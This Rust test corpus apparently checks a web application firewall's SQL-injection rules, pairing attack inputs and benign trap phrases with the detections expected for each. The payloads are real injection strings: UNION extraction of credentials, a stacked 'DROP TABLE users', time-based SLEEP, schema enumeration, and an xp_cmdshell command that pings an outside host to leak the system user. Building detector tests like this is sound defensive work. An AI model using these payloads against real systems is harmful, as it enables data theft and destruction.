// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: Apache-2.0

//! SQLi corpus cases. Field coverage: query + cookies + body (form/json).
//! Rules (paranoia): union-select 1, tautology-or 1, stacked-query 1,
//! time-based 1, tautology-and 2, quote-comment 2, cast-convert 3, hex-literal 3.

use crate::{Case, Expect, Field, Module};

pub static CASES: &[Case] = &[
    // ── malicious: one per rule ────────────────────────────────────────────────
    Case {
        id: "sqli-union-select-query",
        module: Module::Sqli,
        field: Field::Query { name: "id", value: "1 UNION SELECT username,password FROM users--" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-union-select"],
        desc: "classic UNION-based column extraction in a query parameter",
    },
    Case {
        id: "sqli-tautology-or-query",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "' OR '1'='1" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-tautology-or"],
        desc: "quoted OR tautology",
    },
    Case {
        id: "sqli-stacked-query-form",
        module: Module::Sqli,
        field: Field::FormBody("id=1; DROP TABLE users"),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-stacked-query"],
        desc: "stacked DROP after a semicolon, in a form body",
    },
    Case {
        id: "sqli-time-based-json",
        module: Module::Sqli,
        field: Field::JsonBody(r#"{"id":"1 AND SLEEP(5)"}"#),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-time-based"],
        desc: "time-based blind via SLEEP() in a JSON body",
    },
    Case {
        id: "sqli-tautology-and-query",
        module: Module::Sqli,
        field: Field::Query { name: "id", value: "1 AND 1=1" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["sqli-tautology-and"],
        desc: "numeric AND tautology (PL2)",
    },
    Case {
        id: "sqli-quote-comment-cookie",
        module: Module::Sqli,
        field: Field::Cookie("sid=admin'--"),
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["sqli-quote-comment"],
        desc: "quote followed by SQL comment marker, in a cookie",
    },
    Case {
        id: "sqli-cast-convert-query",
        module: Module::Sqli,
        field: Field::Query { name: "id", value: "CAST(username AS int)" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["sqli-cast-convert"],
        desc: "CAST() data exfiltration helper (Notice/PL3)",
    },
    Case {
        id: "sqli-hex-literal-query",
        module: Module::Sqli,
        field: Field::Query { name: "id", value: "0xdeadbeef12" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["sqli-hex-literal"],
        desc: "long hex literal used to encode a string (Notice/PL3)",
    },
    // ── Fase 10b broadening: weak-rule extensions (gotestwaf sql-injection) ──────
    Case {
        id: "sqli-mysql-versioned-comment-query",
        module: Module::Sqli,
        field: Field::Query { name: "id", value: "/*!UNiOn*/ /*!SeLEct*/+1,2,3--" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-mysql-versioned-comment"],
        desc: "MySQL versioned-comment evasion splitting UNION/SELECT — gotestwaf (URL)",
    },
    Case {
        id: "sqli-information-schema-query",
        module: Module::Sqli,
        field: Field::Query {
            name: "id",
            value: "(select group_concat(table_name,0x3a,column_name) from information_schema.columns where table_schema=database())",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-information-schema"],
        desc: "information_schema metadata enumeration — gotestwaf (URL)",
    },
    Case {
        id: "sqli-json-function-query",
        module: Module::Sqli,
        field: Field::Query {
            name: "id",
            value: "-1134') OR JSON_EXTRACT('{\"aKER\": 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-json-function"],
        desc: "boolean SQLi with JSON_EXTRACT() function operand — gotestwaf (URL)",
    },
    // ── Base64Flat harvest (Fase 10c) — recall-lock under §6 base64-decode ───────
    // Not a gotestwaf-tracked deferral; pins that the derived channel feeds SQLi too.
    Case {
        id: "sqli-information-schema-b64",
        module: Module::Sqli,
        field: Field::Query {
            name: "id",
            value: "MSBVTklPTiBTRUxFQ1QgdXNlciBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-union-select", "sqli-information-schema"],
        desc: "base64(`1 UNION SELECT user FROM information_schema.tables`) — caught at 10c via base64-decode",
    },
    // ── CT-less JSON body (Fase 11-bis, §6 fix "a") ──────────────────────────────
    // A JSON envelope POSTed WITHOUT `Content-Type: application/json` (empty CT models
    // the dropped header) must still be flattened, so the per-leaf §6 channel decodes a
    // base64-in-leaf injection. Before the fix the body was `Raw` (whole-string only) and
    // the base64 leaf bypassed every module — the gotestwaf graphql-post CT-less shape.
    Case {
        id: "sqli-ctless-json-body-b64-leaf",
        module: Module::Sqli,
        field: Field::RawBody {
            content_type: "",
            body: "{\"q\":\"MSBVTklPTiBTRUxFQ1QgdXNlcm5hbWUscGFzc3dvcmQgRlJPTSB1c2Vycy0t\"}",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-union-select"],
        desc: "base64(`1 UNION SELECT username,password FROM users--`) inside a JSON leaf, body sent WITHOUT Content-Type — §6 CT-less sniff",
    },
    // ── URLPath coverage (10c REOPEN, pcap): gotestwaf places payloads in the path ──
    Case {
        id: "sqli-urlpath-timebased",
        module: Module::Sqli,
        field: Field::Path("/(select(0)from(select(sleep(15)))v)"),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-time-based"],
        desc: "blind time-based SQLi in the URL PATH — gotestwaf sql-injection URLPath; path now inspected",
    },
    // ── P1-B: header-surface (custom x-* allowlist) ─────────────────────────────
    Case {
        id: "sqli-header-xcustom",
        module: Module::Sqli,
        field: Field::Header { name: "x-9ebec49770", value: "123) AND JSON_DEPTH('{}') != 2521" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-json-function"],
        desc: "SQLi JSON-function in a custom X- header — gotestwaf Header placeholder; allowlist (P1-B)",
    },
    // ── benign / traps ─────────────────────────────────────────────────────────
    Case {
        id: "sqli-benign-css-comment",
        module: Module::Sqli,
        field: Field::Query { name: "css", value: "/*! normalize.css v8.0.1 | MIT License */" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "broadening trap: CSS/JS minifier `/*! … */` (no SQL keyword) must NOT match versioned-comment",
    },
    Case {
        id: "sqli-benign-information-schema-prose",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "see the information schema page of the order form" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "'information schema' as prose (space, no underscore) — must NOT match",
    },
    Case {
        id: "sqli-benign-json-field-name",
        module: Module::Sqli,
        field: Field::Query { name: "fields", value: "json_data, user_profile, created_at" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "a `json_`-prefixed column name with no function call — must NOT match json-function",
    },
    Case {
        id: "sqli-benign-select-word",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "the best select occasions" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "'select' as an English word, not a keyword sequence",
    },
    Case {
        id: "sqli-benign-price-filter",
        module: Module::Sqli,
        field: Field::Query { name: "filter", value: "price > 10" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "legitimate comparison filter",
    },
    Case {
        id: "sqli-benign-sort-desc",
        module: Module::Sqli,
        field: Field::Query { name: "sort", value: "created_at DESC" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "legitimate sort clause",
    },
    Case {
        id: "sqli-trap-or-phrase",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "shoes for men or women=adult" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "OR-tautology narrowing trap: 'word or word=word' must not fire",
    },
    Case {
        id: "sqli-trap-and-phrase",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "red and blue=mix" },
        min_pl: 2,
        expect: Expect::Clean,
        rules: &[],
        desc: "AND-tautology narrowing trap (PL2): 'word and word=word' must not fire",
    },
    // ── 10b-bis: MSSQL OS-exec stored procedure (xp_cmdshell) ────────────────────
    // WIRE (pcap bypass-new.txt): gotestwaf sql-injection stacked+commented
    // `…EXEC Master.dbo.xp_cmdshell @c…`. Was sub-threshold (only sqli-cast-convert
    // Notice=2); the invocation-anchored proc rule (Critical) now blocks it.
    Case {
        id: "sqli-mssql-xp-cmdshell-wire",
        module: Module::Sqli,
        field: Field::RawQuery("1ffc8a206a=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3"),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-mssql-dangerous-proc"],
        desc: "WIRE: MSSQL `EXEC Master.dbo.xp_cmdshell @c` (stacked+commented) — 10b-bis, \
               invocation-anchored proc rule",
    },
    Case {
        id: "sqli-benign-xp-cmdshell-prose",
        module: Module::Sqli,
        field: Field::Query { name: "q", value: "how to disable xp_cmdshell on SQL Server" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "benign prose NAMING the proc (no `.`/`;`/`(`/`exec` qualifier) — invocation anchor keeps it Clean (FP guard)",
    },
    // Lock (probe-confirmed already CAUGHT in current code, score 6 — the wire 200 was a
    // stale binary): nested `select(sleep(15))` time-based SQLi stays blocked.
    Case {
        id: "sqli-time-nested-sleep-wire",
        module: Module::Sqli,
        field: Field::RawQuery("01a0b94d74=%28select%280%29from%28select%28sleep%2815%29%29%29v%29%2F%2A%27+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%27%2522+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%2522%2A%2F"),
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["sqli-time-based"],
        desc: "WIRE lock: nested `(select(0)from(select(sleep(15)))v)` — sqli-time-based already catches it (regression guard)",
    },
];
